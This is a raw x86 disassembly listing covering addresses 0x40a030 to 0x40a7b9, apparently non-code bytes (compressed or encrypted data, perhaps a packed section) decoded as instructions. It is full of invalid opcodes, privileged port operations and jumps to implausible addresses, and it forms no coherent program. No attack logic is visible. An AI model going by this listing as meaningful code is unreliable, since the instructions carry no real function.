  40a030:	push   esp
  40a031:	dec    ebx
  40a032:	adc    al,0x94
  40a034:	sti    
  40a035:	jne    0x40a033
  40a037:	dec    ebx
  40a038:	mov    ch,0x73
  40a03a:	jmp    0xad28889c
  40a03f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a040:	(bad)  
  40a041:	out    0x9e,eax
  40a043:	adc    ebx,edx
  40a045:	js     0x40a08a
  40a047:	jae    0x40a05e
  40a049:	clc    
  40a04a:	adc    DWORD PTR [eax+ecx*2-0x125bbd8c],edx
  40a051:	and    dh,BYTE PTR [edx-0x19cbc3f5]
  40a057:	ss inc ebp
  40a059:	stos   DWORD PTR es:[edi],eax
  40a05a:	sahf   
  40a05b:	jge    0x40a0c6
  40a05d:	inc    esi
  40a05e:	mov    eax,0xeb335128
  40a063:	(bad)  
  40a064:	jmp    0x40a09a
  40a066:	fbld   TBYTE PTR [edi-0x10338bc1]
  40a06c:	and    eax,0x91895d34
  40a071:	or     eax,0xbc1150ff
  40a076:	(bad)  
  40a077:	mov    edx,0x88cb7c65
  40a07c:	dec    esp
  40a07d:	sbb    BYTE PTR [esi],dl
  40a07f:	clc    
  40a080:	ficom  WORD PTR [ecx+0x19]
  40a083:	sbb    BYTE PTR [ebp+ecx*2-0x53],0x4b
  40a088:	mov    eax,ds:0xcb48d6c7
  40a08d:	mov    ebp,0x3837ce7b
  40a092:	mov    dh,0xab
  40a094:	lds    edi,FWORD PTR [eax-0x6d1e66e]
  40a09a:	mov    bl,0x23
  40a09c:	stos   BYTE PTR es:[edi],al
  40a09d:	in     al,dx
  40a09e:	push   ecx
  40a09f:	adc    edi,DWORD PTR [ecx-0x43b52c02]
  40a0a5:	shr    BYTE PTR [esi],0x78
  40a0a8:	cwde   
  40a0a9:	gs stc 
  40a0ab:	mov    dl,0x96
  40a0ad:	and    al,0x4
  40a0af:	mov    cl,0xca
  40a0b1:	pushf  
  40a0b2:	dec    edx
  40a0b3:	ror    DWORD PTR [ecx+0x4031b74a],cl
  40a0b9:	lahf   
  40a0ba:	lahf   
  40a0bb:	add    edi,ecx
  40a0bd:	add    al,0xfb
  40a0bf:	xor    BYTE PTR [ebx],bl
  40a0c1:	and    bl,0x4f
  40a0c4:	sbb    ch,cl
  40a0c6:	daa    
  40a0c7:	dec    ecx
  40a0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0c9:	(bad)  
  40a0ca:	fidiv  DWORD PTR [edx-0x11]
  40a0cd:	loop   0x40a0d1
  40a0cf:	mov    ch,0xa2
  40a0d1:	into   
  40a0d2:	sub    eax,0x20a722fa
  40a0d7:	sbb    DWORD PTR [ecx+0x3a],ecx
  40a0da:	(bad)  
  40a0db:	fcom   QWORD PTR [eax*8+0x68a88aca]
  40a0e2:	int3   
  40a0e3:	lods   eax,DWORD PTR ds:[esi]
  40a0e4:	xchg   esi,eax
  40a0e5:	test   DWORD PTR [ebx],esi
  40a0e7:	jmp    0x2733:0xc0e4b18c
  40a0ee:	mov    WORD PTR [ecx-0x2],?
  40a0f1:	adc    al,0x42
  40a0f3:	adc    dl,BYTE PTR [ebx+0x59]
  40a0f6:	inc    esi
  40a0f7:	jmp    0xa911:0xf95500a5
  40a0fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ff:	jae    0x40a088
  40a101:	pop    edi
  40a102:	mov    dl,0x7f
  40a104:	sbb    BYTE PTR [esi+ebp*1-0x7b],bh
  40a108:	add    ebp,DWORD PTR [esi+0x79]
  40a10b:	test   al,0xf9
  40a10d:	dec    ebx
  40a10e:	ss mov ebp,0xbb51e07d
  40a114:	shl    BYTE PTR [edx-0x231fe40b],0xea
  40a11b:	cwde   
  40a11c:	pop    esi
  40a11d:	int3   
  40a11e:	pop    eax
  40a11f:	lahf   
  40a120:	jbe    0x40a0dc
  40a122:	ja     0x40a135
  40a124:	sub    BYTE PTR [edx+ebx*1],cl
  40a127:	not    DWORD PTR [ecx+0x65]
  40a12a:	xor    BYTE PTR [edx],ch
  40a12c:	pop    eax
  40a12d:	and    bl,dl
  40a12f:	jno    0x40a115
  40a131:	inc    ecx
  40a132:	and    eax,eax
  40a134:	mov    ss,WORD PTR [eax]
  40a136:	pop    ebp
  40a137:	mov    eax,0xa31c65a4
  40a13c:	in     eax,dx
  40a13d:	xchg   ecx,eax
  40a13e:	adc    ecx,DWORD PTR [esi+0x14]
  40a141:	mov    gs,WORD PTR [esi-0x7a937bf4]
  40a147:	rol    DWORD PTR ds:0x3a377796,0x96
  40a14e:	xchg   edx,eax
  40a14f:	xchg   ebx,eax
  40a150:	mov    ch,0x7c
  40a152:	xchg   BYTE PTR [edi+0x79],ah
  40a155:	cwde   
  40a156:	mov    cl,0xc8
  40a158:	push   esi
  40a159:	ds out 0xdc,eax
  40a15c:	cmc    
  40a15d:	inc    esp
  40a15e:	jnp    0x40a1cd
  40a160:	clc    
  40a161:	in     eax,dx
  40a162:	into   
  40a163:	loopne 0x40a156
  40a165:	mov    fs,WORD PTR [ebp+0x499a6d31]
  40a16b:	je     0x40a176
  40a16d:	shl    BYTE PTR [eax-0x12],0x7b
  40a171:	(bad)
  40a174:	cmp    dl,BYTE PTR [ebx-0x38]
  40a177:	fadd   st(2),st
  40a179:	call   0xbe9e5499
  40a17e:	xchg   edx,eax
  40a17f:	jbe    0x40a10e
  40a181:	out    dx,al
  40a182:	xor    eax,0xd0437e4c
  40a187:	sub    DWORD PTR [ebp+0x36a5fa5c],esi
  40a18d:	mov    eax,0x80aaac26
  40a192:	pop    es
  40a193:	adc    DWORD PTR [ebx],edi
  40a195:	(bad)  
  40a197:	push   ecx
  40a198:	push   es
  40a199:	push   cs
  40a19a:	into   
  40a19b:	and    eax,0x5322e954
  40a1a0:	daa    
  40a1a1:	not    BYTE PTR [ebx+0x12dec790]
  40a1a7:	dec    edi
  40a1a8:	mov    edi,0x236a0bb1
  40a1ad:	hlt    
  40a1ae:	dec    ecx
  40a1af:	ds push ebp
  40a1b1:	fbstp  TBYTE PTR [esi+0x57]
  40a1b4:	dec    ebx
  40a1b5:	(bad)
  40a1b9:	dec    ebx
  40a1ba:	jae    0x40a1f9
  40a1bc:	pushf  
  40a1bd:	popa   
  40a1be:	xor    ebx,DWORD PTR [esi-0x2955fb7f]
  40a1c4:	dec    ebx
  40a1c5:	or     ch,ch
  40a1c7:	in     al,dx
  40a1c8:	in     al,0x5f
  40a1ca:	or     al,0x46
  40a1cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1cd:	xor    ebx,esi
  40a1cf:	push   ss
  40a1d0:	mov    esp,0xba9ae8e5
  40a1d5:	mov    ch,0x8b
  40a1d7:	add    eax,0x525960c8
  40a1dc:	fisttp WORD PTR [eax+0x25]
  40a1df:	daa    
  40a1e0:	sbb    ebx,ebp
  40a1e2:	push   0xffffffd3
  40a1e4:	adc    ch,BYTE PTR [eax+0x6f868027]
  40a1ea:	jb     0x40a1ee
  40a1ec:	int3   
  40a1ed:	in     al,0x42
  40a1ef:	icebp  
  40a1f0:	ret    0x3caa
  40a1f3:	test   DWORD PTR [ebp-0x48],esi
  40a1f6:	mov    esp,0x5a68e875
  40a1fb:	mov    WORD PTR [ecx+0x72be1e83],ss
  40a201:	hlt    
  40a202:	xchg   edi,eax
  40a203:	ret    0x1fff
  40a206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a207:	jno    0x40a1b6
  40a209:	jp     0x40a221
  40a20b:	sbb    al,0xec
  40a20d:	sub    edx,DWORD PTR [ebx-0x6c]
  40a210:	push   0xffffffcf
  40a212:	out    0xde,al
  40a214:	mov    ebp,0x3174176e
  40a219:	in     al,dx
  40a21a:	out    0x21,al
  40a21c:	jmp    0xbd131c3d
  40a221:	sbb    dh,BYTE PTR [esi]
  40a223:	push   esi
  40a224:	das    
  40a225:	jp     0x40a1c7
  40a227:	pusha  
  40a228:	add    esi,DWORD PTR [eax-0x5129bd56]
  40a22e:	cmp    BYTE PTR [ecx+ecx*4],0xf5
  40a232:	cmovne esi,DWORD PTR [esi]
  40a235:	xchg   edi,eax
  40a236:	vpmacsdqh xmm14,xmm4,xmm5,XMMWORD PTR [edx]
  40a23c:	or     BYTE PTR [esi+eax*4+0x311bf8b9],dh
  40a243:	loop   0x40a2c3
  40a245:	cli    
  40a246:	push   edi
  40a247:	dec    eax
  40a248:	aaa    
  40a249:	cmp    BYTE PTR [edx+eiz*8-0x3d232413],ch
  40a250:	cmp    DWORD PTR [esi],0xd2b2e86e
  40a256:	(bad)  
  40a257:	mov    ds:0xde9c12aa,eax
  40a25c:	xlat   BYTE PTR ds:[ebx]
  40a25d:	test   al,0x38
  40a25f:	fwait
  40a260:	out    0x41,eax
  40a262:	push   esi
  40a263:	xor    BYTE PTR [ecx],cl
  40a265:	mov    ebp,0x79c05e9b
  40a26a:	xchg   esp,eax
  40a26b:	in     eax,0xc0
  40a26d:	pop    ss
  40a26e:	mov    eax,0x23336feb
  40a273:	mov    ebp,0xd0eb501c
  40a278:	dec    ebp
  40a279:	js     0x40a2ee
  40a27b:	mov    ebp,0xca929d3a
  40a280:	ja     0x40a28d
  40a282:	sbb    BYTE PTR [eax-0x6daa8711],ah
  40a288:	mov    dl,0x42
  40a28a:	add    DWORD PTR [esi],esp
  40a28c:	inc    esi
  40a28d:	inc    esi
  40a28e:	std    
  40a28f:	int    0x6b
  40a291:	mov    ch,0xda
  40a293:	sbb    DWORD PTR [ebx+0x3606c73e],esp
  40a299:	clc    
  40a29a:	xchg   esp,eax
  40a29b:	and    ebp,DWORD PTR [esi]
  40a29d:	pop    edx
  40a29e:	fwait
  40a29f:	aaa    
  40a2a0:	push   bx
  40a2a2:	and    al,0x54
  40a2a4:	sbb    eax,0x9c8cd8f2
  40a2a9:	adc    BYTE PTR [ecx-0x52d18fb],bl
  40a2af:	dec    esi
  40a2b0:	xor    DWORD PTR [edx+0x6e],ebp
  40a2b3:	or     al,0xe8
  40a2b5:	mov    ds:0xf3098feb,al
  40a2ba:	sbb    al,0x60
  40a2bc:	pop    edx
  40a2bd:	xor    BYTE PTR [ecx+0x1773d53a],bl
  40a2c3:	mov    ecx,edx
  40a2c5:	gs pop ss
  40a2c7:	(bad)  
  40a2c9:	jb     0x40a32e
  40a2cb:	jne    0x40a2fc
  40a2cd:	mov    edi,0x62d7e4d3
  40a2d2:	jp     0x40a286
  40a2d4:	outs   dx,BYTE PTR ds:[esi]
  40a2d5:	sbb    ebx,ebx
  40a2d7:	dec    esi
  40a2d8:	sub    BYTE PTR [ecx],cl
  40a2da:	mov    eax,0xa7080c6c
  40a2df:	popa   
  40a2e0:	imul   ebx,ecx,0x93239179
  40a2e6:	jne    0x40a2b3
  40a2e8:	or     eax,0x81fb986
  40a2ed:	mov    eax,0x3e093f7d
  40a2f2:	iret   
  40a2f3:	(bad)  
  40a2f4:	dec    esp
  40a2f5:	scas   al,BYTE PTR es:[edi]
  40a2f6:	push   esi
  40a2f7:	push   ecx
  40a2f8:	inc    edi
  40a2f9:	mov    ds:0x7cd22014,eax
  40a2fe:	fs retf 0xa1ff
  40a302:	pop    es
  40a303:	outs   dx,BYTE PTR ds:[esi]
  40a304:	sbb    ecx,ecx
  40a306:	int3   
  40a307:	adc    eax,0xd3ad64c
  40a30c:	pushf  
  40a30d:	lock jnp 0x40a2eb
  40a310:	jmp    ebx
  40a312:	fnstenv [ecx-0x66]
  40a315:	sub    cl,cl
  40a317:	loop   0x40a340
  40a319:	mov    dl,0x2f
  40a31b:	into   
  40a31c:	dec    ebx
  40a31d:	cdq    
  40a31e:	call   0x4f11c828
  40a323:	sbb    BYTE PTR [esi],ch
  40a325:	rol    DWORD PTR [edi],cl
  40a327:	sub    BYTE PTR [edi-0x6be79268],dh
  40a32d:	idiv   BYTE PTR [edi-0x774366dc]
  40a333:	mov    ebp,0x571f096d
  40a338:	jmp    0xd7a704ab
  40a33d:	cmp    ebx,ebp
  40a33f:	sbb    BYTE PTR [edi+0x2c],bh
  40a342:	mov    bl,0x5c
  40a344:	sbb    cl,BYTE PTR es:[ebp-0x43]
  40a348:	cmp    al,0xa2
  40a34a:	stc    
  40a34b:	and    BYTE PTR [edi],bl
  40a34d:	out    0xe0,eax
  40a34f:	out    0x15,al
  40a351:	in     eax,dx
  40a352:	jmp    ecx
  40a354:	ss inc edi
  40a356:	and    esp,esi
  40a358:	jmp    0x544b97e6
  40a35d:	sub    DWORD PTR [esi-0x496415c],ebx
  40a363:	adc    edx,DWORD PTR [edi+0xe]
  40a366:	(bad)  [ebx-0x6c4cf916]
  40a36c:	(bad)  
  40a36d:	and    al,BYTE PTR [esi+ecx*2+0x23]
  40a371:	mov    cl,0xed
  40a373:	push   esi
  40a374:	lock mov ch,0x8a
  40a377:	xchg   ecx,eax
  40a378:	aas    
  40a379:	jmp    0x1ac695c8
  40a37e:	mov    DWORD PTR [ebx-0x36c9df19],ebx
  40a384:	jge    0x40a33a
  40a386:	push   ebx
  40a387:	js     0x40a401
  40a389:	nop
  40a38a:	icebp  
  40a38b:	enter  0x4ebf,0xe2
  40a38f:	repnz xchg ecx,eax
  40a391:	dec    esi
  40a392:	jae    0x40a3fe
  40a394:	xor    DWORD PTR [edi+0x6f29f729],ebx
  40a39a:	repnz mov ah,0x9f
  40a39d:	adc    DWORD PTR [ecx],eax
  40a39f:	lahf   
  40a3a0:	clc    
  40a3a1:	leave  
  40a3a2:	imul   BYTE PTR [eax+0x650f2a74]
  40a3a8:	aad    0xe1
  40a3aa:	lds    ebp,FWORD PTR es:[ebp-0x4d]
  40a3ae:	popa   
  40a3af:	ins    BYTE PTR es:[edi],dx
  40a3b0:	xchg   esp,eax
  40a3b1:	mov    edi,DWORD PTR [esp+ebp*1+0x315a5087]
  40a3b8:	cmp    DWORD PTR ds:0x1c4d66e3,esp
  40a3be:	xchg   esi,eax
  40a3bf:	(bad)  [edi+0x64]
  40a3c2:	dec    edx
  40a3c3:	jns    0x40a3d3
  40a3c5:	pop    esp
  40a3c6:	cmc    
  40a3c7:	call   0x1b8c3e29
  40a3cc:	xchg   BYTE PTR [ebp-0x57],ah
  40a3cf:	jns    0x40a371
  40a3d1:	sub    edx,ecx
  40a3d3:	jmp    0x7262df31
  40a3d8:	push   edi
  40a3d9:	jo     0x40a371
  40a3db:	mov    ebx,0x6e7318a3
  40a3e0:	push   ebp
  40a3e1:	lock cmp BYTE PTR [edi+eiz*2-0x1e],0x25
  40a3e7:	loop   0x40a3e8
  40a3e9:	or     DWORD PTR gs:[esi+0x643d87ac],esi
  40a3f0:	sbb    ebp,edx
  40a3f2:	mov    ebx,0x95bb7077
  40a3f7:	mov    ds:0x9c9f11b0,al
  40a3fc:	(bad)  
  40a3fd:	xchg   esp,eax
  40a3fe:	and    eax,0x56e3aaf5
  40a403:	add    eax,DWORD PTR [esp+esi*1+0x1c5bba5c]
  40a40a:	jmp    0x1a5476db
  40a40f:	test   DWORD PTR ds:0x4cf6bae9,ecx
  40a415:	fs pop esi
  40a417:	sbb    ecx,ebp
  40a419:	push   0x9b49684
  40a41e:	ret    
  40a41f:	pop    es
  40a420:	push   0x64
  40a422:	(bad)  
  40a423:	jo     0x40a43d
  40a425:	cmp    cl,cl
  40a427:	sub    eax,DWORD PTR [esi-0x13f4244a]
  40a42d:	sub    eax,0xb6940d65
  40a432:	xor    esi,DWORD PTR [edx-0x21]
  40a435:	jmp    0x40a499
  40a437:	test   eax,0x532072a2
  40a43c:	jecxz  0x40a4b9
  40a43e:	mov    ebp,0x31340b95
  40a443:	push   edx
  40a444:	push   ss
  40a445:	stc    
  40a446:	and    eax,0x314bccdc
  40a44b:	jo     0x40a400
  40a44d:	fs clc 
  40a44f:	mov    edx,0xc9a83a0
  40a454:	pop    ss
  40a455:	outs   dx,DWORD PTR ds:[esi]
  40a456:	add    DWORD PTR gs:[bp+si],ecx
  40a45a:	das    
  40a45b:	test   al,0x8
  40a45d:	and    ebx,DWORD PTR [ecx-0x45]
  40a460:	stos   BYTE PTR es:[edi],al
  40a461:	shl    BYTE PTR [edx-0x28],0x64
  40a465:	dec    ebx
  40a466:	xor    al,0x21
  40a468:	imul   esp,DWORD PTR [ebx+ebp*8-0x72c9e8d3],0xf44195e4
  40a473:	test   al,0x78
  40a475:	les    ecx,FWORD PTR [ecx]
  40a477:	mov    ebp,0x5457ddf6
  40a47c:	push   es
  40a47d:	les    esi,FWORD PTR [edi+0x5f]
  40a480:	loope  0x40a470
  40a482:	rol    DWORD PTR [edi],0x4b
  40a485:	repz jbe 0x40a40f
  40a488:	or     BYTE PTR [ebx],ch
  40a48a:	dec    ebx
  40a48b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a48d:	lock dec esi
  40a48f:	sbb    eax,0x3440d6e5
  40a494:	repz ficom WORD PTR [ebx-0x34452d66]
  40a49b:	jp     0x40a47a
  40a49d:	jo     0x40a460
  40a49f:	push   ecx
  40a4a0:	mov    ebp,0xb091137a
  40a4a5:	mov    eax,0xb6aae8fa
  40a4aa:	lods   al,BYTE PTR ds:[esi]
  40a4ab:	fxch   st(0)
  40a4ad:	xchg   edx,eax
  40a4ae:	mov    esi,0x71f68bd6
  40a4b3:	pop    esi
  40a4b4:	cdq    
  40a4b5:	push   0x68d3cb72
  40a4ba:	adc    BYTE PTR [ebx],dh
  40a4bc:	in     al,0xb6
  40a4be:	and    eax,eax
  40a4c0:	addr16 in eax,dx
  40a4c2:	mov    ecx,0x392c5e11
  40a4c7:	in     al,dx
  40a4c8:	cmp    ah,dh
  40a4ca:	adc    eax,0xc1d95a8f
  40a4cf:	sbb    eax,ebp
  40a4d1:	and    dh,ch
  40a4d3:	imul   eax,DWORD PTR [ecx],0x70
  40a4d6:	mov    es,WORD PTR [edi-0x56]
  40a4d9:	add    ecx,DWORD PTR [ebx-0x44]
  40a4dc:	lahf   
  40a4dd:	es dec edi
  40a4df:	mov    bl,0x23
  40a4e1:	into   
  40a4e2:	popa   
  40a4e3:	sahf   
  40a4e4:	mov    edx,0xf3f94234
  40a4e9:	call   0x81d9103b
  40a4ee:	and    al,BYTE PTR [ebx]
  40a4f0:	in     eax,dx
  40a4f1:	and    BYTE PTR [edi-0xa],dh
  40a4f4:	sub    BYTE PTR [esi],0xa
  40a4f7:	dec    edx
  40a4f8:	test   eax,0xcb74685c
  40a4fd:	leave  
  40a4fe:	call   0xc4953af2
  40a503:	xlat   BYTE PTR ds:[ebx]
  40a504:	push   0xffffffa4
  40a506:	xlat   BYTE PTR ds:[ebx]
  40a507:	rol    DWORD PTR [edx],1
  40a509:	xor    al,0x21
  40a50b:	mov    ds:0xc6091c03,eax
  40a510:	cmp    DWORD PTR [ecx+ecx*2-0xfd3cc4b],esp
  40a517:	(bad)  
  40a518:	adc    al,0xe
  40a51a:	pop    ds
  40a51b:	xor    BYTE PTR [edi],0xcf
  40a51e:	push   0x2c
  40a520:	cmc    
  40a521:	lock and esi,DWORD PTR [ebx-0x2f5d35ff]
  40a528:	cwde   
  40a529:	inc    esp
  40a52a:	and    BYTE PTR [esi+0x1d],0x96
  40a52e:	or     al,0x59
  40a530:	sub    esi,DWORD PTR [esi-0x70]
  40a533:	aas    
  40a534:	scas   eax,DWORD PTR es:[edi]
  40a535:	idiv   DWORD PTR [eax]
  40a537:	xchg   DWORD PTR [esi+0x2],edx
  40a53a:	push   es
  40a53b:	jle    0x40a5b4
  40a53d:	ror    DWORD PTR [edx+0x7756287c],1
  40a543:	dec    ecx
  40a544:	push   di
  40a546:	int3   
  40a547:	lahf   
  40a548:	pandn  mm7,QWORD PTR [ecx-0x3da2f1d1]
  40a54f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a550:	ret    
  40a551:	out    dx,al
  40a552:	xor    eax,0x7bb93c7c
  40a557:	into   
  40a558:	mov    eax,0xc5a182d8
  40a55d:	or     cl,ah
  40a55f:	or     al,ah
  40a561:	or     eax,0x67e1030a
  40a566:	iret   
  40a567:	inc    eax
  40a568:	imul   ecx,DWORD PTR [edi+0x68294b44],0xffffff96
  40a56f:	push   ss
  40a570:	call   0xa204:0xcb6e6600
  40a577:	jne    0x40a5ca
  40a579:	sbb    al,0xdd
  40a57b:	data16 xor al,0x1a
  40a57e:	rcr    ecx,cl
  40a580:	adc    DWORD PTR ds:0xc6ba648a,ecx
  40a586:	adc    DWORD PTR [esi-0x77514ea6],esp
  40a58c:	stos   DWORD PTR es:[edi],eax
  40a58d:	lods   al,BYTE PTR ds:[esi]
  40a58e:	push   ebx
  40a58f:	fiadd  WORD PTR [esi+0x27]
  40a592:	xchg   ecx,eax
  40a593:	popa   
  40a594:	jl     0x40a5c5
  40a596:	outs   dx,BYTE PTR fs:[esi]
  40a598:	mov    ah,ch
  40a59a:	sbb    DWORD PTR [esi+edi*8+0x10d3d849],ebx
  40a5a1:	(bad)  
  40a5a2:	std    
  40a5a3:	mov    bl,0xb0
  40a5a5:	sahf   
  40a5a6:	into   
  40a5a7:	and    al,0xc0
  40a5a9:	inc    ecx
  40a5aa:	(bad)  
  40a5ab:	hlt    
  40a5ac:	cmp    dh,bl
  40a5ae:	out    0xa5,eax
  40a5b0:	mov    cl,0x77
  40a5b2:	(bad)
  40a5b5:	sbb    BYTE PTR [eax],0x1
  40a5b8:	in     eax,0x1a
  40a5ba:	test   al,0xef
  40a5bc:	jmp    0xc9e0ef22
  40a5c1:	iret   
  40a5c2:	data16 std 
  40a5c4:	and    al,BYTE PTR [ecx-0x23]
  40a5c7:	cmp    eax,0x9d91734f
  40a5cc:	xchg   esi,eax
  40a5cd:	scas   eax,DWORD PTR es:[edi]
  40a5ce:	lods   al,BYTE PTR ds:[esi]
  40a5cf:	aad    0x28
  40a5d1:	dec    ecx
  40a5d2:	ret    0xb757
  40a5d5:	(bad)  
  40a5d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5d8:	in     al,0x59
  40a5da:	rol    ebp,1
  40a5dc:	jmp    0x95d:0x79c1f14d
  40a5e3:	out    dx,al
  40a5e4:	aam    0x2d
  40a5e6:	(bad)  
  40a5e7:	in     eax,0x60
  40a5e9:	in     al,0xa2
  40a5eb:	ds hlt 
  40a5ed:	gs cmc 
  40a5ef:	out    0xc7,eax
  40a5f1:	jne    0x40a5b0
  40a5f3:	jbe    0x40a656
  40a5f5:	xor    DWORD PTR [eax-0x4b],ecx
  40a5f8:	rcr    DWORD PTR [edi],1
  40a5fa:	cwde   
  40a5fb:	int3   
  40a5fc:	mov    ds:0x9028be6a,al
  40a601:	loopne 0x40a5ea
  40a603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a604:	sub    DWORD PTR ds:0x7a9390cf,ebp
  40a60a:	sub    eax,0x7a25c9e8
  40a60f:	add    eax,0x8b9efa
  40a614:	mov    ah,0xd6
  40a616:	fdivrp st(1),st
  40a618:	push   edx
  40a619:	xor    bh,BYTE PTR [ecx]
  40a61b:	adc    ecx,ebp
  40a61d:	bound  ebx,QWORD PTR [edi]
  40a61f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a620:	push   eax
  40a621:	lods   al,BYTE PTR ds:[esi]
  40a622:	xchg   edi,eax
  40a623:	shr    DWORD PTR [eax+ecx*2+0x746fea2a],cl
  40a62a:	mov    ebp,DWORD PTR [ebx+eiz*4-0x2f6d3b76]
  40a631:	mov    ?,WORD PTR [ebp+0x27418137]
  40a637:	cmp    ecx,ebx
  40a639:	mov    cl,0x40
  40a63b:	dec    ebx
  40a63c:	push   esi
  40a63d:	xor    dl,dl
  40a63f:	push   ss
  40a640:	dec    ebp
  40a641:	push   esi
  40a642:	cmp    DWORD PTR [esi+0x7f],edx
  40a645:	(bad)  
  40a646:	mov    ch,0x5e
  40a648:	mov    cl,0xcf
  40a64a:	frstor ds:0x3c74559c
  40a650:	xor    edi,ebp
  40a652:	mov    cl,0x20
  40a654:	sbb    DWORD PTR [edx+0x12b56842],eax
  40a65a:	in     al,0x1b
  40a65c:	iret   
  40a65d:	es xor eax,0x1f8c27f
  40a663:	into   
  40a664:	inc    ebp
  40a665:	xchg   esp,eax
  40a666:	call   0x668:0x8ed0736a
  40a66d:	push   esi
  40a66e:	mov    ebp,0x7f01694c
  40a673:	fldcw  WORD PTR [eax-0x19a521a3]
  40a679:	lahf   
  40a67a:	iret   
  40a67b:	or     al,0xf2
  40a67d:	add    eax,0x483315ad
  40a682:	adc    bh,bl
  40a684:	icebp  
  40a685:	sbb    eax,0x4a2ee606
  40a68a:	mov    dh,0xa6
  40a68c:	mov    esi,0x9a5ce03a
  40a691:	rcl    DWORD PTR [esi+0x1366744e],0x33
  40a698:	bound  ebp,QWORD PTR [esi-0x50]
  40a69b:	pop    ss
  40a69c:	jle    0x40a627
  40a69e:	loop   0x40a68c
  40a6a0:	repz lahf 
  40a6a2:	lods   al,BYTE PTR cs:[esi]
  40a6a4:	mov    ds:0xf652730f,eax
  40a6a9:	adc    dh,dl
  40a6ab:	je     0x40a667
  40a6ad:	cld    
  40a6ae:	fdiv   DWORD PTR [eax-0x41c1c842]
  40a6b4:	sbb    BYTE PTR [esi],dh
  40a6b6:	js     0x40a6ac
  40a6b8:	in     eax,dx
  40a6b9:	sub    ebx,DWORD PTR [ecx-0xbc78c8e]
  40a6bf:	push   esi
  40a6c0:	inc    eax
  40a6c1:	test   BYTE PTR [ecx],bh
  40a6c3:	ror    ecx,1
  40a6c5:	push   ss
  40a6c6:	dec    ebx
  40a6c7:	push   ecx
  40a6c8:	xchg   ebx,eax
  40a6c9:	es adc eax,0x2380b27d
  40a6cf:	xcrypt-ctr (bad)
  40a6d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d1:	sbb    DWORD PTR [ecx*1+0x27337e12],edx
  40a6d8:	xor    al,0x8a
  40a6da:	push   ax
  40a6dc:	retf   0xc3aa
  40a6df:	out    0x37,al
  40a6e1:	jg     0x40a70f
  40a6e3:	push   esp
  40a6e4:	jg     0x40a6b2
  40a6e6:	imul   esi,DWORD PTR [edx],0x14
  40a6e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6ea:	dec    edi
  40a6eb:	inc    BYTE PTR ds:0x4b20a00a
  40a6f1:	pop    ecx
  40a6f2:	and    esp,ebp
  40a6f4:	outs   dx,BYTE PTR ds:[esi]
  40a6f5:	push   ecx
  40a6f6:	adc    al,0x22
  40a6f8:	cwde   
  40a6f9:	stc    
  40a6fa:	add    al,0x6c
  40a6fc:	out    dx,al
  40a6fd:	or     BYTE PTR [edi+0x0],ch
  40a700:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a701:	test   BYTE PTR [eax+0x58],dl
  40a704:	gs adc al,0x62
  40a707:	or     eax,0x9823a152
  40a70c:	jo     0x40a74b
  40a70e:	or     edx,eax
  40a710:	pop    edi
  40a711:	dec    ecx
  40a712:	jne    0x40a6f2
  40a714:	push   ecx
  40a715:	push   0xffffffe1
  40a717:	mov    bl,0x60
  40a719:	sbb    al,0xef
  40a71b:	jo     0x40a6d1
  40a71d:	outs   dx,BYTE PTR ds:[esi]
  40a71e:	cwde   
  40a71f:	in     eax,dx
  40a720:	je     0x40a74b
  40a722:	iret   
  40a723:	loop   0x40a76e
  40a725:	les    edx,FWORD PTR [ebx-0x47]
  40a728:	mov    fs,WORD PTR [edi+esi*8]
  40a72b:	inc    esi
  40a72c:	push   cs
  40a72d:	mov    ebp,0xdbf64338
  40a732:	sbb    ebx,DWORD PTR [edi-0x70]
  40a735:	sbb    bh,ch
  40a737:	test   al,0x1
  40a739:	jp     0x40a700
  40a73b:	mov    edi,0x8b58c85
  40a740:	enter  0xeac9,0xdb
  40a744:	inc    esp
  40a745:	push   esp
  40a746:	add    cl,bh
  40a748:	pop    ecx
  40a749:	mov    bh,0x9a
  40a74b:	js     0x40a7b8
  40a74d:	jecxz  0x40a788
  40a74f:	imul   edi,DWORD PTR [esi],0xf
  40a752:	mov    edi,gs
  40a754:	cmp    ah,BYTE PTR [ecx]
  40a756:	pop    ecx
  40a757:	and    al,0x92
  40a759:	pop    esi
  40a75a:	test   BYTE PTR [ecx],al
  40a75c:	ss fwait
  40a75e:	dec    ebp
  40a75f:	jg     0x40a7af
  40a761:	(bad)  
  40a762:	mov    esi,0x609ab454
  40a768:	push   ebp
  40a769:	(bad)  
  40a76a:	imul   edi,DWORD PTR [ebp+0x64b54bee],0xd081e9a4
  40a774:	shl    BYTE PTR [eax-0x1a],1
  40a777:	sbb    ch,BYTE PTR [edx+0x3a]
  40a77a:	gs sub al,0x83
  40a77d:	jle    0x40a7ae
  40a77f:	mov    ebx,DWORD PTR [esi-0xd3773aa]
  40a785:	mov    ?,edi
  40a787:	mov    esp,0x6c1d8922
  40a78c:	xchg   esi,eax
  40a78d:	push   esi
  40a78e:	clc    
  40a78f:	add    al,0x75
  40a791:	in     al,0x44
  40a793:	xor    al,0x12
  40a795:	inc    ebx
  40a796:	jmp    0x40a7a5
  40a798:	outs   dx,BYTE PTR ds:[esi]
  40a799:	inc    esp
  40a79a:	push   edi
  40a79b:	mov    dh,0x74
  40a79d:	jmp    0x40a772
  40a79f:	inc    eax
  40a7a0:	jo     0x40a7cc
  40a7a2:	lock rcr BYTE PTR [eax+edx*1],1
  40a7a6:	xor    cl,BYTE PTR [eax]
  40a7a8:	ret    0x66ee
  40a7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7ac:	popa   
  40a7ad:	push   ds
  40a7ae:	mov    bl,0xb9
  40a7b0:	xchg   edx,eax
  40a7b1:	jnp    0x40a7a8
  40a7b3:	or     DWORD PTR [ebp-0x31],esp
  40a7b6:	adc    BYTE PTR [ebp+0x37],ch
  40a7b9:	call   0xb527c87d
